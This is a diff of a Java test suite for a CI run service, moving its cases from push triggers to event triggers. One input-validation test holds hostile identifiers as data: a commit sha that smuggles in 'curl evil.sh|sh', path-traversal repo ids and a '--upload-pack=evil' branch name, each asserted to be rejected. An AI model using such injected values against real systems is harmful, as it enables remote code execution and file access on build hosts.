@@ -7,7 +7,7 @@ import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
-import eu.wohlben.qits.ci.control.CiConfigSource.ConfigLookup;
+import eu.wohlben.qits.ci.control.CiConfigSource.CommitHeld;
 import eu.wohlben.qits.ci.control.CiStepRunner.StepOutcome;
 import eu.wohlben.qits.ci.control.CiStepRunner.StepResult;
 import eu.wohlben.qits.ci.entity.CiRun;
@@ -30,9 +30,18 @@ import java.util.concurrent.TimeUnit;
 import org.junit.jupiter.api.Test;
 
 /**
- * Drives the orchestrator synchronously (package-private {@code execute}) against the fake config
- * source and the scripted-event step runner — the whole run/step state machine with no docker, no
- * container and no git host.
+ * Drives the orchestrator synchronously (package-private {@code executeEventRun}, through {@code
+ * CiTestSupport.executePipeline}) against the scripted-event step runner — the whole run/step state
+ * machine with no docker, no container and no git host.
+ *
+ * <p><b>It used to drive pushes, and that is the whole of what changed on 2026-09-05.</b> The entry
+ * was {@code execute(repoId, branch, sha)}: accept a push and run it. Nothing here was ever about
+ * pushes — it is the step loop, the failure vocabulary, the branch filter, the cancellation
+ * semantics — so with the push arm retired every case drives the same machinery through the one
+ * trigger type there is. What left with the push path left this file too: the config read on the run
+ * worker and its four outcomes (ABSENT, GONE, UNREACHABLE, INVALID plus the parse), because a
+ * trigger file is read and parsed before a row exists now, so a broken or missing one is a WARN in
+ * {@code CiEventTriggerService} and never a row here.
  */
 @QuarkusTest
 public class CiRunServiceTest extends CiTestSupport {
@@ -53,26 +62,31 @@ public class CiRunServiceTest extends CiTestSupport {
 
   private String repoId;
   private String sha;
+  private String pipeline;
 
   @org.junit.jupiter.api.BeforeEach
   void resetPorts() {
     announcer.reset();
   }
 
+  /** A fresh repository and commit, and the pipeline the next {@link #run}/{@link #accept} declares. */
   private void seedConfig(String content) {
     repoId = UUID.randomUUID().toString();
     sha = UUID.randomUUID().toString().replace("-", "");
-    fakeConfig.put(repoId, sha, ConfigLookup.found(content));
+    pipeline = content;
+  }
+
+  /** Accept and run the seeded pipeline on one branch, synchronously — no worker timing to wait out. */
+  private void run(String branch) {
+    executePipeline(repoId, branch, sha, pipeline);
   }
 
   /**
-   * One push announced, as {@code bus/ScmPublishCommitListener} announces it: a fresh event id per
-   * call, because every push is its own {@code SCMPublishCommit} and two runs under one id are one
-   * commit built twice.
+   * The same, <b>asynchronously</b>: the row is written and the worker picks it up, which is the only
+   * way to stage a state that exists while a run is in flight (a cancellation arriving mid-step).
    */
-  private void announcePush(String repoId, String branch, String sha) {
-    service.onPostReceive(
-        CiRepoRef.of(repoId), branch, "0".repeat(40), sha, UUID.randomUUID().toString());
+  private void accept(String branch) {
+    service.onEventTrigger(eventRun(repoId, branch, sha, pipeline));
   }
 
   private CiRun soleRun() {
@@ -84,7 +98,7 @@ public class CiRunServiceTest extends CiTestSupport {
   @Test
   public void greenRunRecordsSuccessWithStepOutputs() {
     seedConfig(CONFIG_TWO_STEPS);
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.SUCCESS, run.status);
@@ -123,7 +137,7 @@ public class CiRunServiceTest extends CiTestSupport {
   public void failingStepFailsTheRunAndSkipsTheRest() {
     seedConfig(CONFIG_TWO_STEPS);
     fakeRunner.script(0, new StepResult(7, false, StepOutcome.OK, "boom"));
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.FAILED, run.status);
@@ -144,7 +158,7 @@ public class CiRunServiceTest extends CiTestSupport {
   public void timedOutStepEndsTheRunTimedOutWithAMarkedOutput() {
     seedConfig(CONFIG_TWO_STEPS);
     fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "partial output"));
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     // A deadline is not a pipeline verdict, so neither the step nor the run is FAILED.
@@ -182,7 +196,7 @@ public class CiRunServiceTest extends CiTestSupport {
         });
     fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "half a line"));
 
-    announcePush(repoId, "main", sha);
+    accept("main");
     String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
     service.cancel(runId);
     cancelled.countDown();
@@ -207,7 +221,7 @@ public class CiRunServiceTest extends CiTestSupport {
           - image: alpine:3
             script: echo slow
         """);
-    service.execute(repoId, "main", sha);
+    run("main");
 
     assertEquals(30, fakeRunner.executed().get(0).timeoutSeconds());
     // An absent field means the shipped default: 30 minutes.
@@ -232,7 +246,7 @@ public class CiRunServiceTest extends CiTestSupport {
               docker build -t "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA" .
               docker push "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA"
         """);
-    service.execute(repoId, "main", sha);
+    run("main");
 
     assertEquals(CiRunStatus.SUCCESS, soleRun().status);
     assertEquals(2, fakeRunner.executed().size());
@@ -244,269 +258,37 @@ public class CiRunServiceTest extends CiTestSupport {
     assertEquals(CiStepStatus.SUCCESS, service.stepsFor(soleRun().id).get(1).status);
   }
 
-  // --- the per-step branch filter ---
-
-  private static final String CONFIG_MAINTENANCE_LEG =
-      """
-      steps:
-        - image: node-base:latest
-          script: npm test
-        - image: node-base:latest
-          branches:
-            - prefix: maintenance/
-          script: ./release.sh
-      """;
+  // The per-step branch filter used to live here — five cases about `branches:` on a step, the
+  // note a branch-skipped row carried, and a run whose every step was skipped still finishing green.
+  // The key was a `ci-post-receive.yml` feature and was always a parse error in a trigger file (an
+  // event run's branch is the trigger's single decision, so a per-step filter over it is inert or
+  // unreachable), so it went with per-push CI on 2026-09-05 along with CiPipeline.BranchFilter and
+  // the SKIPPED-by-branch arm in runSteps. That the key is still REFUSED, loudly, is
+  // CiEventTriggerParserTest's.
 
   @Test
-  public void aStepTheBranchDoesNotBindIsSkippedWithANoteAndTheRunStaysGreen() {
-    seedConfig(CONFIG_MAINTENANCE_LEG);
-    service.execute(repoId, "main", sha);
-
-    CiRun run = soleRun();
-    assertEquals(CiRunStatus.SUCCESS, run.status, "an unbound step is a non-event to the verdict");
-    List<CiStep> recorded = service.stepsFor(run.id);
-    assertEquals(2, recorded.size(), "the step is recorded, not passed over");
-    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status);
-    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
-    assertEquals("[step not bound to branch main]", recorded.get(1).output);
-    assertNull(recorded.get(1).exitCode);
-    // Nothing started, so it carries neither timestamp — and no container was ever launched.
-    assertNull(recorded.get(1).startedAt);
-    assertNull(recorded.get(1).finishedAt);
-    assertEquals(1, fakeRunner.executed().size());
-  }
-
-  @Test
-  public void aBoundStepRunsOnTheBranchThatBindsIt() {
-    seedConfig(CONFIG_MAINTENANCE_LEG);
-    service.execute(repoId, "maintenance/qits-spa-ui-components", sha);
-
-    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
-    List<CiStep> recorded = service.stepsFor(soleRun().id);
-    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status);
-    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status);
-    assertEquals(2, fakeRunner.executed().size());
-    assertEquals("./release.sh", fakeRunner.executed().get(1).script());
-  }
-
-  @Test
-  public void anUnboundStepBlocksNothingAfterIt() {
-    // The half a green run cannot show: `failed` is untouched, so the loop continues — asserted by
-    // the step AFTER the unbound one actually executing.
-    seedConfig(
-        """
-        steps:
-          - image: alpine:3
-            branches:
-              - prefix: maintenance/
-            script: ./release.sh
-          - image: alpine:3
-            script: echo after
-        """);
-    service.execute(repoId, "main", sha);
-
-    List<CiStep> recorded = service.stepsFor(soleRun().id);
-    assertEquals(CiStepStatus.SKIPPED, recorded.get(0).status);
-    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status);
-    assertEquals(1, fakeRunner.executed().size());
-    assertEquals("echo after", fakeRunner.executed().get(0).script());
-  }
-
-  @Test
-  public void theTwoKindsOfSkippedAreDistinguishableByTheirOutput() {
-    // The whole of how they stay apart: a never-reached step keeps its null output, a branch-skipped
-    // one carries the bracketed note. No new status, no new column, no migration.
-    seedConfig(
-        """
-        steps:
-          - image: alpine:3
-            script: npm test
-          - image: alpine:3
-            branches:
-              - prefix: maintenance/
-            script: ./release.sh
-          - image: alpine:3
-            script: echo never
-        """);
-    fakeRunner.script(0, new StepResult(1, false, StepOutcome.OK, "tests failed"));
-    service.execute(repoId, "main", sha);
-
-    assertEquals(CiRunStatus.FAILED, soleRun().status);
-    List<CiStep> recorded = service.stepsFor(soleRun().id);
-    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
-    // Both of the following are SKIPPED, and both were skipped for different reasons.
-    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
-    assertNull(recorded.get(1).output, "a step the loop never reached says nothing");
-    assertEquals(CiStepStatus.SKIPPED, recorded.get(2).status);
-    assertNull(recorded.get(2).output);
-  }
-
-  @Test
-  public void aRunWithAnUnscopedABoundAndAnUnboundStepRecordsAllThreeReadably() {
-    // The boundary case, read off the rows the way a person would: three declared steps, three
-    // outcomes, one run, and the reason for each is in the row itself.
-    seedConfig(
-        """
-        steps:
-          - image: alpine:3
-            script: npm test
-          - image: alpine:3
-            branches:
-              - prefix: maintenance/
-            script: ./release.sh
-          - image: alpine:3
-            branches:
-              - exact: main
-            script: ./deploy.sh
-        """);
-    service.execute(repoId, "maintenance/qits-spa-angular", sha);
-
-    CiRun run = soleRun();
-    assertEquals(CiRunStatus.SUCCESS, run.status);
-    List<CiStep> recorded = service.stepsFor(run.id);
-    assertEquals(3, recorded.size());
-    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status, "the unscoped step ran");
-    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status, "the bound step ran");
-    assertEquals(CiStepStatus.SKIPPED, recorded.get(2).status, "the unbound step did not");
-    assertEquals("[step not bound to branch maintenance/qits-spa-angular]", recorded.get(2).output);
-    assertEquals(2, fakeRunner.executed().size());
-  }
-
-  @Test
-  public void aRunWhoseEveryStepIsBranchSkippedFinishesGreenAndAnnounces() {
-    // The empty-pipeline precedent rather than a new rule — and asserted rather than assumed,
-    // because "trivially green" has to mean the same green: it announces the deploy and it publishes.
-    seedConfig(
-        """
-        steps:
-          - image: alpine:3
-            branches:
-              - prefix: maintenance/
-            script: ./release.sh
-          - image: alpine:3
-            branches:
-              - exact: release
-            script: ./ship.sh
-        """);
-    service.execute(repoId, "main", sha);
-
-    CiRun run = soleRun();
-    assertEquals(CiRunStatus.SUCCESS, run.status);
-    assertEquals(0, fakeRunner.executed().size(), "no container was launched");
-    List<CiStep> recorded = service.stepsFor(run.id);
-    assertEquals(2, recorded.size());
-    for (CiStep step : recorded) {
-      assertEquals(CiStepStatus.SKIPPED, step.status);
-      assertEquals("[step not bound to branch main]", step.output);
-    }
-    assertEquals(1, announcer.announced().size(), "a green run announces, however little it did");
-    assertEquals(run.id, announcer.announced().get(0).runId());
-  }
-
-  @Test
-  public void brokenConfigRecordsAConfigErrorRunWithNoSteps() {
-    seedConfig("steps:\n  - image: alpine:3\n"); // missing script
-    service.execute(repoId, "main", sha);
-
-    CiRun run = soleRun();
-    assertEquals(CiRunStatus.CONFIG_ERROR, run.status);
-    assertNotNull(run.finishedAt);
-    // Nothing was ever launched, so the run pins no daemon.
-    assertNull(run.daemonVersion);
-    assertEquals(0, service.stepsFor(run.id).size());
-    assertEquals(0, fakeRunner.executed().size());
-  }
-
-  @Test
-  public void absentConfigRecordsNothing() {
-    repoId = UUID.randomUUID().toString();
-    service.execute(repoId, "main", "0123456789abcdef");
-    assertEquals(0, service.runsFor(repoId).size());
-  }
-
-  @Test
-  public void unreachableGitHostRecordsNothing() {
-    // The retry schedule is empty here (CiTestSupport), so the first unreachable answer decides.
-    repoId = UUID.randomUUID().toString();
-    sha = "0123456789abcdef";
-    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
-    service.execute(repoId, "main", sha);
-    assertEquals(0, service.runsFor(repoId).size());
-  }
-
-  @Test
-  public void anUnreachableGitHostIsRetriedAndTheRunSurvivesTheBounce() {
-    // The 2026-08-13 loss: the deploy train bounced the git host, the very next push's config read
-    // failed once, and the discarded row cost the whole deploy — the announcing event was already
-    // consumed. Patience is the fix, so two failures followed by an answer must build green.
-    service.unreachableRetryDelays(List.of(java.time.Duration.ZERO, java.time.Duration.ZERO));
-    repoId = UUID.randomUUID().toString();
-    sha = "0123456789abcdef";
-    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
-    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
-    fakeConfig.put(repoId, sha, ConfigLookup.found(CONFIG_TWO_STEPS));
-
-    service.execute(repoId, "main", sha);
-
-    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
-    assertEquals(3, fakeConfig.configReads().stream().filter((repoId + "@" + sha)::equals).count());
-  }
-
-  @Test
-  public void aGitHostStillUnreachableAfterThePatienceRecordsNothing() {
-    // The schedule ran out and every read failed: the old decision stands, just later.
-    service.unreachableRetryDelays(List.of(java.time.Duration.ZERO));
-    repoId = UUID.randomUUID().toString();
-    sha = "0123456789abcdef";
-    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
-
-    service.execute(repoId, "main", sha);
-
-    assertEquals(0, service.runsFor(repoId).size());
-    assertEquals(2, fakeConfig.configReads().stream().filter((repoId + "@" + sha)::equals).count());
-  }
-
-  @Test
-  public void presentConfigWithNoStepsRecordsATriviallyGreenRun() {
-    // Opted in (file present) but nothing to verify — visible, unlike an absent file.
+  public void aPipelineWithNoStepsRecordsATriviallyGreenRun() {
+    // A trigger file that matched but declares nothing to verify. Recorded, and green: the run says
+    // something true about the commit, which is that this pipeline had no objection to it.
     seedConfig("# no steps yet\n");
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.SUCCESS, run.status);
     assertEquals(0, service.stepsFor(run.id).size());
-  }
-
-  @Test
-  public void commitGoneBeforeTheRunRecordsNothing() {
-    // Force-pushed away between push and run: nothing is recorded, so a commit whose build was
-    // never broken is never shown red.
-    repoId = UUID.randomUUID().toString();
-    sha = "0123456789abcdef";
-    fakeConfig.put(repoId, sha, ConfigLookup.gone());
-    service.execute(repoId, "main", sha);
-    assertEquals(0, service.runsFor(repoId).size());
-  }
-
-  @Test
-  public void unusableConfigRecordsAConfigErrorRun() {
-    repoId = UUID.randomUUID().toString();
-    sha = "0123456789abcdef";
-    fakeConfig.put(repoId, sha, ConfigLookup.invalid("too large"));
-    service.execute(repoId, "main", sha);
-    assertEquals(CiRunStatus.CONFIG_ERROR, soleRun().status);
   }
 
   @Test
   public void aShaGoneCheckoutDiscardsTheRunWhenTheCommitIsIndeedGone() {
-    // The daemon's checkout is the probe now: it reports SHA_GONE, and the config re-read confirms
-    // the commit was force-pushed away mid-queue. The run describes a push that no longer exists.
+    // The daemon's checkout is the probe: it reports SHA_GONE, and commitHeld confirms the commit
+    // was force-pushed away after the run was accepted. The run describes work on a commit that no
+    // longer exists.
     seedConfig(CONFIG_TWO_STEPS);
-    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // what the post-failure re-read sees
+    fakeConfig.putCommit(repoId, sha, CommitHeld.GONE);
     fakeRunner.script(
         0,
         new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: reference is not a tree: deadbeef"));
-    service.execute(repoId, "main", sha);
+    run("main");
     assertEquals(0, service.runsFor(repoId).size());
   }
 
@@ -517,7 +299,7 @@ public class CiRunServiceTest extends CiTestSupport {
     seedConfig(CONFIG_TWO_STEPS);
     fakeRunner.script(
         0, new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: could not read from remote"));
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.FAILED, run.status);
@@ -529,14 +311,29 @@ public class CiRunServiceTest extends CiTestSupport {
   }
 
   @Test
+  public void aShaGoneCheckoutOnAnUnreachableGitHostStaysOnTheRecord() {
+    // The third answer, and the one a boolean would have lost: the host could not be asked, so it
+    // has said nothing about the commit. UNKNOWN must not read as GONE — discarding here would erase
+    // a verdict on evidence nobody has, which is the "a read failure must not invent a gate" rule
+    // pointed the other way.
+    seedConfig(CONFIG_TWO_STEPS);
+    fakeConfig.putCommit(repoId, sha, CommitHeld.UNKNOWN);
+    fakeRunner.script(
+        0, new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: reference is not a tree"));
+    run("main");
+
+    assertEquals(CiRunStatus.FAILED, soleRun().status, "an unanswered probe keeps the row");
+  }
+
+  @Test
   public void anInitFailureWithNoReasonIsRecordedGenericallyAndNeverDiscardsTheRun() {
     // A hostile daemon can send InitFailed with an absent reason — the codec decodes that to null
     // rather than throwing, deliberately. It has to land as a generic setup failure and must NOT
     // fall through the SHA_GONE branch, which would let a container delete the run watching it.
     seedConfig(CONFIG_TWO_STEPS);
-    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // the re-read would say "discard" if reached
+    fakeConfig.putCommit(repoId, sha, CommitHeld.GONE); // the probe would say "discard" if reached
     fakeRunner.script(0, new StepResult(-1, false, StepOutcome.INIT_FAILED, "(no reason given)"));
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.FAILED, run.status);
@@ -559,7 +356,7 @@ public class CiRunServiceTest extends CiTestSupport {
       resetCiState();
       seedConfig(CONFIG_TWO_STEPS);
       fakeRunner.script(0, new StepResult(-1, false, outcome, "diagnosis for " + outcome));
-      service.execute(repoId, "main", sha);
+      run("main");
 
       CiStep first = service.stepsFor(soleRun().id).get(0);
       assertEquals(CiStepStatus.FAILED, first.status, outcome.name());
@@ -587,7 +384,7 @@ public class CiRunServiceTest extends CiTestSupport {
     // written upfront any more, so the exception path is what has to write those rows.
     seedConfig(CONFIG_TWO_STEPS);
     fakeRunner.throwOn(0, new IllegalStateException("transient failure"));
-    service.execute(repoId, "main", sha);
+    run("main");
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.FAILED, run.status);
@@ -622,7 +419,7 @@ public class CiRunServiceTest extends CiTestSupport {
         });
     fakeRunner.script(0, new StepResult(137, false, StepOutcome.OK, "half a line"));
 
-    announcePush(repoId, "main", sha);
+    accept("main");
     String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
     service.cancel(runId);
     cancelled.countDown();
@@ -646,69 +443,6 @@ public class CiRunServiceTest extends CiTestSupport {
   }
 
   @Test
-  public void aNewPushDedupesOlderQueuedPushesOnTheSameBranch() throws Exception {
-    repoId = UUID.randomUUID().toString();
-    String blockerSha = "1".repeat(40);
-    String olderSha = "2".repeat(40);
-    String newerSha = "3".repeat(40);
-    String otherBranchSha = "4".repeat(40);
-    fakeConfig.put(repoId, blockerSha, ConfigLookup.found(CONFIG_TWO_STEPS));
-    fakeConfig.put(repoId, olderSha, ConfigLookup.found(CONFIG_TWO_STEPS));
-    fakeConfig.put(repoId, newerSha, ConfigLookup.found(CONFIG_TWO_STEPS));
-    fakeConfig.put(repoId, otherBranchSha, ConfigLookup.found(CONFIG_TWO_STEPS));
-
-    CompletableFuture<Void> blockerStarted = new CompletableFuture<>();
-    CountDownLatch releaseBlocker = new CountDownLatch(1);
-    fakeRunner.during(
-        0,
-        spec -> {
-          if (!spec.sha().equals(blockerSha)) {
-            return;
-          }
-          blockerStarted.complete(null);
-          try {
-            releaseBlocker.await(10, TimeUnit.SECONDS);
-          } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-          }
-        });
-
-    announcePush(repoId, "blocker", blockerSha);
-    blockerStarted.get(10, TimeUnit.SECONDS);
-    announcePush(repoId, "main", olderSha);
-    announcePush(repoId, "feature", otherBranchSha);
-    announcePush(repoId, "main", newerSha);
-    releaseBlocker.countDown();
-    service.awaitIdle();
-    forgetLoadedEntities();
-
-    List<CiRun> runs = service.runsFor(repoId);
-    CiRun older = runs.stream().filter(run -> run.commitSha.equals(olderSha)).findFirst().orElseThrow();
-    CiRun newer = runs.stream().filter(run -> run.commitSha.equals(newerSha)).findFirst().orElseThrow();
-    CiRun otherBranch =
-        runs.stream().filter(run -> run.commitSha.equals(otherBranchSha)).findFirst().orElseThrow();
-    assertEquals(
-        CiRunStatus.CANCELLED,
-        older.status,
-        "a superseded run is cancelled, not failed — it never answered a question about this commit");
-    assertEquals(CiRunService.DEDUPED, older.cancellationReason);
-    assertEquals(newer.id, older.supersededByRunId);
-    assertNull(older.daemonVersion, "a deduped queued build never starts");
-    assertEquals(CiRunStatus.SUCCESS, newer.status);
-    assertEquals(CiRunStatus.SUCCESS, otherBranch.status, "another branch is independent");
-    assertEquals(0, service.stepsFor(older.id).size());
-    // The status is a READ surface and the change to it published nothing: a deduped row is written
-    // at accept time and reaches neither announcer, before this classification or after it. So
-    // qits-projects' build gate — which matches verdicts on (repoId, commitSha) — sees what it saw.
-    assertTrue(
-        announcer.failed().stream().noneMatch(failure -> failure.runId().equals(older.id)),
-        "a deduped run announces no BuildFailed — it is bookkeeping about the queue");
-    assertTrue(
-        announcer.announced().stream().noneMatch(green -> green.runId().equals(older.id)),
-        "and no BuildSuccessful either");
-  }
-
-  @Test
   public void manualCancellationPersistsTheOptionalReason() throws Exception {
     seedConfig(CONFIG_TWO_STEPS);
     CompletableFuture<String> reachedStep = new CompletableFuture<>();
@@ -723,7 +457,7 @@ public class CiRunServiceTest extends CiTestSupport {
             Thread.currentThread().interrupt();
           }
         });
-    announcePush(repoId, "main", sha);
+    accept("main");
     String runId = reachedStep.get(10, TimeUnit.SECONDS);
     service.cancel(runId, "No longer needed");
     cancelled.countDown();
@@ -785,8 +519,8 @@ public class CiRunServiceTest extends CiTestSupport {
               run.branch = "main";
               run.commitSha = sha;
               run.status = CiRunStatus.RUNNING;
-              run.triggerType = CiTriggerType.POST_RECEIVE;
-              run.configPath = CiConfigParser.CONFIG_PATH;
+              run.triggerType = CiTriggerType.EVENT;
+              run.configPath = TEST_TRIGGER_PATH;
               run.createdAt = Instant.now();
               run.startedAt = Instant.now();
               runs.persist(run);
@@ -809,7 +543,7 @@ public class CiRunServiceTest extends CiTestSupport {
   @Test
   public void cancellingAFinishedRunIsAConflictAndAnUnknownRunIsANotFound() {
     seedConfig(CONFIG_TWO_STEPS);
-    service.execute(repoId, "main", sha);
+    run("main");
     String runId = soleRun().id;
 
     assertThrows(ConflictException.class, () -> service.cancel(runId));
@@ -820,74 +554,78 @@ public class CiRunServiceTest extends CiTestSupport {
 
   @Test
   public void hostileIdentifiersAreRejectedAtTheEntryPoint() {
-    // A push says what somebody pushed, so the ids on it are validated before they reach a
-    // filesystem path or an argv — whatever announced it.
+    // An event payload says what somebody else's service said, and a checkout trigger reads the
+    // branch and sha straight out of it — so the ids are validated at the accept, before they reach
+    // a filesystem path or an argv. This is the same guard the retired push intake carried, on the
+    // one entry that is left.
     String good = UUID.randomUUID().toString();
-    String event = UUID.randomUUID().toString();
+    assertThrows(
+        BadRequestException.class,
+        () -> service.onEventTrigger(eventRun(good, "main", "HEAD\nset +e\ncurl evil.sh|sh #", CONFIG_TWO_STEPS)));
+    assertThrows(
+        BadRequestException.class,
+        () -> service.onEventTrigger(eventRun("../../etc", "main", "cafebabe0000000", CONFIG_TWO_STEPS)));
     assertThrows(
         BadRequestException.class,
         () ->
-            service.onPostReceive(
-                CiRepoRef.of(good), "main", null, "HEAD\nset +e\ncurl evil.sh|sh #", event));
-    assertThrows(
-        BadRequestException.class,
-        () ->
-            service.onPostReceive(
-                CiRepoRef.of("../../etc"), "main", null, "cafebabe0000000", event));
-    assertThrows(
-        BadRequestException.class,
-        () ->
-            service.onPostReceive(
-                CiRepoRef.of(good), "--upload-pack=evil", null, "cafebabe0000000", event));
+            service.onEventTrigger(
+                eventRun(good, "--upload-pack=evil", "cafebabe0000000", CONFIG_TWO_STEPS)));
     // The name half is checked too — but ONLY when it is there, which is the whole compatibility
-    // arm: an id-addressed push announces no pair and must still be accepted (every other case in
-    // this method passes one with no names at all).
+    // arm: a candidate the catalogue could name nothing for carries no pair and must still be
+    // accepted (every other case in this method passes one with no names at all).
     assertThrows(
         BadRequestException.class,
         () ->
-            service.onPostReceive(
-                CiRepoRef.of(good, "../../etc", "qits-ci"), "main", null, "cafebabe0000000", event));
+            service.onEventTrigger(
+                eventRun(
+                    CiRepoRef.of(good, "../../etc", "qits-ci"),
+                    "main",
+                    "cafebabe0000000",
+                    CONFIG_TWO_STEPS)));
     assertThrows(
         BadRequestException.class,
         () ->
-            service.onPostReceive(
-                CiRepoRef.of(good, "qits", "../evil"), "main", null, "cafebabe0000000", event));
+            service.onEventTrigger(
+                eventRun(
+                    CiRepoRef.of(good, "qits", "../evil"),
+                    "main",
+                    "cafebabe0000000",
+                    CONFIG_TWO_STEPS)));
   }
 
   @Test
-  public void onPostReceiveExecutesAsynchronously() throws Exception {
+  public void theAcceptExecutesAsynchronously() throws Exception {
     seedConfig(CONFIG_TWO_STEPS);
-    service.onPostReceive(
-        CiRepoRef.of(repoId), "main", "0".repeat(40), sha, UUID.randomUUID().toString());
+    accept("main");
     service.awaitIdle();
     assertEquals(CiRunStatus.SUCCESS, soleRun().status);
   }
 
   @Test
-  public void theAnnouncingEventLandsOnTheRunSoTheAnnouncementCanBeCausedByIt() throws Exception {
+  public void theTriggeringEventLandsOnTheRunSoTheAnnouncementCanBeCausedByIt() throws Exception {
     // CausingEvent turns this column into the published BuildSuccessful's parentId, on another
     // thread and possibly after a restart — so the row is the whole hand-off, and this is where it
     // is written. What the publish does with it is asserted in CiEventTriggerCausationTest.
     seedConfig(CONFIG_TWO_STEPS);
-    String eventId = UUID.randomUUID().toString();
-    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
+    CiRunService.EventRun request = eventRun(repoId, "main", sha, pipeline);
+    service.onEventTrigger(request);
     service.awaitIdle();
 
     CiRun run = soleRun();
     assertEquals(CiRunStatus.SUCCESS, run.status);
-    assertEquals(eventId, run.triggerEventId);
-    assertEquals(CiTriggerType.POST_RECEIVE, run.triggerType);
+    assertEquals(request.eventId(), run.triggerEventId);
+    assertEquals(CiTriggerType.EVENT, run.triggerType);
   }
 
   @Test
-  public void oneAnnouncedPushIsOneRun() throws Exception {
-    // The unique constraint on (trigger_event_id, repo_id, config_path) reaches pushes now. The
-    // duplicate is SETTLED rather than thrown: a second delivery must not leave the push owed
-    // forever over a run that already exists.
+  public void oneAnnouncedEventIsOneRun() throws Exception {
+    // The unique constraint on (trigger_event_id, repo_id, config_path). The duplicate is SETTLED
+    // rather than thrown: a second delivery must not leave the event owed forever over a run that
+    // already exists.
     seedConfig(CONFIG_TWO_STEPS);
-    String eventId = UUID.randomUUID().toString();
-    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
-    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
+    CiRunService.EventRun request = eventRun(repoId, "main", sha, pipeline);
+    service.onEventTrigger(request);
+    service.onEventTrigger(request);
     service.awaitIdle();
 
     assertEquals(1, service.runsFor(repoId).size(), "one announcement, one run");
